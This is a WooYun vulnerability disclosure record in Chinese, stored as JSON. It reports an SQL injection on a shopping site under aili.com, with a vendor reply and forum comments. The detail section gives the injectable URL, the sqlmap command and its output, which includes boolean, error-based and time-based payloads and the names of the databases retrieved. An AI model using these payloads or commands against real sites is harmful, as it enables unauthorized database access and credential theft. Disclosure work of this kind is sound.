{"id": 76545, "wybug_id": "wooyun-2015-0164647", "wybug_title": "爱丽旗下某站存在注入漏洞(DBA)", "wybug_corp": "aili.com", "wybug_author": "心云", "wybug_date": "2015-12-27 17:07", "wybug_open_date": "2016-02-09 23:29", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-09：\t细节向公众公开  简要描述： 听说爱丽网是乌云发礼物最多的厂商，我就来了  详细说明：  貌似网站挂了。。。。。。注入点：\nhttp://www.wenji99.com/?m=product&s=list&brand=%E6%83%A0%E6%99%AEHP&brand_id=623\n\npython sqlmap.py -u \"http://www.wenji99.com/?m=product&s=list&brand=%E6%83%A0%E6%99%AEHP&brand_id=623\" --dbs\n\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n][14:16:40] [INFO] GET parameter 'brand' seems to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable[14:16:40] [INFO] GET parameter 'brand' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable[14:16:57] [INFO] GET parameter 'brand' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT)' injectableGET parameter 'brand' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection point(s) with a total of 850 HTTP(s) requests:---Parameter: brand (GET)    Type: boolean-based blind    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: m=product&s=list&brand=%E6%83%A0%E6%99%AEHP' RLIKE (SELECT (CASE WHEN (1900=1900) THEN 0x2545362538332541302545362539392541454850 ELSE 0x28 END)) AND 'Ppcc'='Ppcc&brand_id=623    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: m=product&s=list&brand=%E6%83%A0%E6%99%AEHP' AND (SELECT 7915 FROM(SELECT COUNT(*),CONCAT(0x716b707a71,(SELECT (ELT(7915=7915,1))),0x716a767171,FLOOR(RAND(0)*2))x FROM INFORMATION_S    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: m=product&s=list&brand=%E6%83%A0%E6%99%AEHP' AND (SELECT * FROM (SELECT(SLEEP(5)))pTQH) AND 'opmk'='opmk&brand_id=623---[14:22:04] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.3, Nginxback-end DBMS: MySQL 5.0[14:22:04] [INFO] fetching database names[14:22:12] [INFO] the SQL query used returns 3 entries[14:22:14] [INFO] retrieved: information_schema[14:22:17] [INFO] retrieved: mysql[14:22:18] [INFO] retrieved: wenjiavailable databases [3]:[*] information_schema[*] mysql[*] wenji\n   漏洞证明：  数据库 而且是dba\n\n主库 599张表\n\n密码信息\n\n   修复方案：  求不忽略   版权声明：转载请注明来源 心云@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-12-28 14:08 厂商回复： 这个站洞洞多的史无前例 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-27 19:26 |    \t\tsocket \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:14        | )\t\t \n  真勤奋，你周末都不带出去耍的么    \n     2015-12-27 19:38 |    \t\t心云 \t\t\t( 普通白帽子  |\t\t\t        Rank:184 漏洞数:57        | Rank:200 漏洞数:55 | Rank:300 漏洞数:70 ...)\t\t \n  @socket 哈哈哈 出去不好玩啊     \n     2015-12-28 14:10 |    \t\t心云 \t\t\t( 普通白帽子  |\t\t\t        Rank:184 漏洞数:57        | Rank:200 漏洞数:55 | Rank:300 漏洞数:70 ...)\t\t \n  @aili.com 既然都知道洞洞多 怎么不修复呀。。。有没有小礼物 哈哈哈    \n     2016-01-06 11:17 |    \t\t糖剩七颗 \t\t\t( 普通白帽子  |\t\t\t        Rank:649 漏洞数:87        | 天涯何处无屌丝)\t\t \n  送了什么礼物啊？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}